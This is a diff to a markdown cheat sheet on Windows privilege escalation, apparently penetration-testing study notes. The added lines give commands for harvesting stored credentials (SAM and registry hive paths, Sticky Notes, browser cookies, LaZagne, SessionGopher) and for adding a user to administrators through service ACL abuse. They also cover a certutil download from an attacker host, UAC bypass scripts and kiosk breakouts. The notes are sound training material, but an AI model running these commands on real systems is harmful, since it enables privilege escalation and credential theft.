@@ -47,16 +47,45 @@ pagetitle: Windows Privilege Escalation
 	- Environment Variables!!
 		- `Get-ChildItem Env:`
 
+## Collecting Sensitive Information or Credentials
+
+- For automatic enumeration, use `LaZagne` (see below section)
+
 **Searching for Sensitive Information**
 - Check common folders for passwords - it's pretty common (can use functions below)
 	- Check hidden directories/files with `{dir/ls} -force`
 - Example: search XAMPP for config files (could also do keepass databases or the like):
 	- `Get-ChildItem -Path C:\Users -Include *.txt, *.ini, -File -Recurse -ErrorAction SilentlyContinue -force`
 - Search contents of files
-	- `findstr /si {password/pass/pwd/cred/vnc} *.{txt/ini/xml/config}`
+	- `findstr /sim {password/pass/pwd/cred/vnc} *.{txt/ini/xml/config} (*.{txt/ini/xml/config})`
 - Using sensitive information
 	- Runas - can run commands as a privileged user - this is basically sudo
 		- `runas /user:{username} {program, like powershell.exe}`
+- StickyNotes
+	- People will often use sticky notes to store passwords, which can be retrieved at `C:\Users\{user}\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` (along with `plum.sqlite-shm` and `plum.sqlite-wal`)
+	- Then, open these three files in a sqlite3 browser and `select Text from Note`
+- Other places to look for credentials:
+
+```
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+```
 
 **Find sensitive PowerShell information**
 - Looking for *PowerShell Transcription* and *PowerShell Script Block Logging*
@@ -73,19 +102,43 @@ pagetitle: Windows Privilege Escalation
 	- Can also be provided keys
 		- `evil-winrm -i {IP} -c certificate.pem -k priv-key.pem -S`
 
-**Automated tools**
-- winPEAS lol
-	- `winpeas.exe --fileanalysis` to analyze files
-	- available at `https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe`
-	- host it, download it, run it
-	- Can miss stuff, and knowing OSCP it will. 
-- PowerUp powershell script
-	- [https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1]
-- SharpUp ghostpack executable
-	- [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe]
-- Seatbelt
-	- https://github.com/GhostPack/Seatbelt
-	- Full enum: `.\Seatbelt.exe -group=all`
+**Browser Credentials**
+- Can use [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies/logins from Chrome
+	- `.\SharpChrome.exe logins /unprotect`
+- Firefox stores cookies  in a SQLite database at `%APPDATA%\Mozilla\Firefox\Profiles\{random_value}.default-release`
+	- We can copy the database with `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
+	- Then, use something like [cookieextractor](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract the cookies from the DB
+
+**Remote Access Tool Credentials**
+- Use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials
+
+## Automated Tools
+
+**Winpeas**
+- Great general priv esc script
+- Available at `https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe`
+- `winpeas.exe --fileanalysis` to analyze files
+
+**LaZagne**
+- Specializes in finding credentials in all kinds of areas (browsers, chat clients, email, memory dumps, internal storage)
+- [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
+- Run with `\lazagne.exe all`
+
+**PowerUp Powershell Script**
+- [https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
+
+**SharpUp ghostpack executable**
+- [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
+- Will check for misconfigured ACLs
+
+**Seatbelt**
+- https://github.com/GhostPack/Seatbelt
+- Full enum: `.\Seatbelt.exe -group=all`
+
+**Sherlock**
+- Check for missing patches on outdated versions of Windows
+- [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)
+- `Import-Module .\Sherlock.ps1` and `Find-AllVulns`
 
 ## Leveraging Windows Services
 
@@ -176,32 +229,29 @@ LPVOID lpReserved ) // Reserved
 C:\Users\Public\reverseshell.exe
 ```
 
+**Abusing Service ACLs**
+- If we have full control over a service, we can use `sc` to modify the service
+- Something like `sc config {vulnerable_service} binpath="cmd /c net localgroup administrators {our_user} /add"` will do the trick
+	- Alternatively, we could provide a path to a malicious executable
+
 **Abusing Unquoted Service Paths**
 - This occurs when we can write to a service's main directory without being able to modify the current files
 - Can again be found using `wmic` in cmd: 
 	- `wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """`
 	- These will list potentially vulnerable paths
 - Abusing this:
-	- Let's say a service path is in use like "C:\\Program Files\\Enterprise Agents\\Company Files\\GammaServ.exe"
-	- Windows will first check for "C:\\Program.exe", then "C:\\Program Files\\Enterprise.exe", then "C:\\Program Files\\Enterprise Agents\\Company.exe", and finally "C:\\Program Files\\Enterprise Agents\\Company Files\\GammaServ.exe"
-		- If we can write to the "C:\\Program Files\\Enterprise Agents\\" directory, we can make an executable called Company.exe, which will be used before the real one
-	- Then, restart the service
+	- Let's say a service path is in use like `C:\Program Files\Enterprise Agents\Company Files\GammaServ.exe`
+	- Windows will first check for `C:\Program.exe`, then `C:\Program Files\Enterprise.exe`, then `C:\Program Files\Enterprise Agents\Company.exe`, and finally `C:\Program Files\Enterprise Agents\Company Files\GammaServ.exe`
+		- If we can write to the `C:\Program Files\Enterprise Agents\` directory, we can make an executable called `Company.exe`, which will be used before the real one
+	- Then, restart the service somehow and our executable should run
 
 ## Abusing Other Windows Components
 
 **Living off of the Land**
 - [LOLBAS](https://lolbas-project.github.io/#) is a great resource similar to gtfobins
-- Microsoft signed files that have extra, unexpected functionality, such as:
-  - Executing code
-  - Compiling code
-  - File operations
-  - Persistence
-  - UAC bypass
-  - Credential theft
-  - Dumping process memory
-  - Surveillance
-  - Log evasion
-  - DLL side-loading/hijacking without relocation
+- Microsoft signed files that have extra, unexpected functionality, such as, executing code, compiling code, file operations, persistence, UAC bypass, credential theft, dumping process memory, surveillance, log evasion, and DLL side-loading/hijacking
+	- For example, `certutil` can download files with `certutil.exe -urlcache -split -f http://{kaliIP}/{file} {output_file}`
+
 
 **Using Scheduled Tasks**
 - Need to know who runs the scheduled tasks, what triggers are required, and what the tasks do
@@ -283,8 +333,26 @@ C:\Users\Public\reverseshell.exe
 		- `.\PrintSpoofer64.exe -i -c powershell.exe`
 
 **Bypassing UAC**
+- If we're a local administrator on a system, but get an `Access is denied.` error while a attempting to perform a privileged action, it's likely UAC
 - Windows User Account Control can be bypassed using many different techniques
 - Check if it's running with `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
 	- Check level with `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` (5 being the highest level)
 - The bypasses/escalations we can do depend on our Windows version number, which we can get with `[environment]::OSVersion.Version` 
 - The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of bypasses per Windows version number
+- The [Bypass UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) powershell script can automate this
+	- `Import-Module .\Bypass-UAC.ps1` and then `Bypass-UAC -Method UacMethodSysprep`
+
+**Bypassing GPO restrictions** 
+- Often, GPO restrictions will be in place where users can't access perform certain actions
+	- This could be accessing a certain share or folder from Explorer or running cmd/powershell
+- Thus, we can do something like open MS paint, open the file dialog box from there, and then type the fileshare in the filename field
+	- Something like `\\127.0.0.1\c$\users\{user}`
+	- This can also help us break out of restricted environments or kiosks, as we can host `cmd.exe` in a network share, access the share from paint's explorer dialog, right click `cmd.exe`, and open it
+		- Alternatively, we can edit an existing shortcut such that the `Target` field is `C:\Windows\System32\cmd.exe`, and thus opening the shortcut pops cmd
+	- `.bat`, `.ps`, and `.vbs` scripts will sometimes automatically execute, which can also be used to gain a shell
+- Can also try using Q-Dir or Explorer++ if GPO restrictions are on explorer itself (similar story with Simpleregedit or SmallRegistryEditor for registry restrictions)
+
+## Miscellaneous
+
+**WireShark**
+- Wireshark isn't limited to Administrators by default, so if we can run it, we can capture creds sent over the wirexx
